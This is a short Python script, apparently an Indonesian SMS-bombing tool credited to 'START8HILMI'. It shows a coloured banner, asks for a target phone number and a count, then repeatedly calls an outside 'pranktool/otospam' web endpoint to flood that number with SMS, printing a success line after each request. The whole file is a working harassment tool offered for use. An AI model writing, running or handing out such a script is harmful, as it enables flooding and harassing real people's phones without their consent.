
import os,requests,json
import time
from requests import post,get
m = "\33[31;1m";
i = "\33[32;1m";
p = "\33[37;1m";
os.system("clear")
time.sleep(1)
os.system("clear")
logo = f"""\t
       {i}╔═╗{p}┌─┐┌─┐┌┬┐  {i}╦ ╦{p}┌┐┌┬  ┬
       {i}╚═╗{p}├─┘├─┤│││  {i}║ ║{p}││││  │
       {i}╚═╝{p}┴  ┴ ┴┴ ┴  {i}╚═╝{p}┘└┘┴─┘┴
         {p}Author {m}: {p}START8HILMI\n"""



print(logo)
nomor = input(f"\t{p}[{m}¤{p}]{p} Nomor {m}: {p} ")
jum = int(input(f"\t{p}[{m}¤{p}] Jumlah {m}: {p}"))
print("\n")
for i in range(jum):
    url = requests.get(f"https://darkteam.my.id/pranktool/otospam/index.php?nomor={nomor}")
    print(f"\t{p}[{m}¤{p}]Berhasil Kirim Sms {m}"+nomor)
